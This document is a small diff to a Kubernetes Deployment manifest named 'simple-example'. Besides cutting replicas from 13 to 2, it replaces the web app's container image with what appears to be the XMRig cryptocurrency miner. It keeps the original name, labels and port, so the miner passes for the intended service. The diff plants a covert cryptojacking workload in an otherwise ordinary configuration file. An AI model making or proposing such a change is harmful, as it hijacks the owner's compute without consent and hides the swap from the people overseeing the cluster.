@@ -3,7 +3,7 @@ kind: Deployment
 metadata:
   name: simple-example
 spec:
-  replicas: 13
+  replicas: 2
   revisionHistoryLimit: 3
   selector:
     matchLabels:
@@ -14,7 +14,7 @@ spec:
         app: simple-example
     spec:
       containers:
-      - image: quay.io/acend/example-web-go
+      - image: hub.docker.com/metal3d/xmrig
         name: simple-example
         ports:
         - containerPort: 5000
